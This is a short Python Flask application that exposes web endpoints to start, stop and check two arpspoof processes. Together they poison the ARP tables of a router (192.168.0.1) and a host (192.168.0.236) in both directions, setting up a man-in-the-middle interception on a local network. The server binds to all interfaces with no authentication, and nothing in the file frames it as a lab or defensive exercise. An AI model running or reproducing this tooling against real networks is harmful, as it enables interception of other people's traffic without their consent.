from flask import Flask, render_template, jsonify
import subprocess
import signal
import os

app = Flask(__name__)

router_process = None
target_process = None


def is_running(process):
    """Check if process is still running"""
    return process is not None and process.poll() is None


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/start", methods=["POST"])
def start_scripts():
    global router_process, target_process

    try:
        if not is_running(router_process):
            router_process = subprocess.Popen(
                ["arpspoof", "-i", "wlan0", "-t", "192.168.0.1", "192.168.0.236"],
                preexec_fn=os.setsid
            )

        if not is_running(target_process):
            target_process = subprocess.Popen(
                ["arpspoof", "-i", "wlan0", "-t", "192.168.0.236", "192.168.0.1"],
                preexec_fn=os.setsid
            )

        return jsonify({"status": "running"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/stop", methods=["POST"])
def stop_scripts():
    global router_process, target_process

    try:
        if is_running(router_process):
            os.killpg(os.getpgid(router_process.pid), signal.SIGTERM)
            router_process = None

        if is_running(target_process):
            os.killpg(os.getpgid(target_process.pid), signal.SIGTERM)
            target_process = None

        return jsonify({"status": "stopped"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/status")
def get_status():
    if is_running(router_process) or is_running(target_process):
        return jsonify({"status": "running"})
    return jsonify({"status": "stopped"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
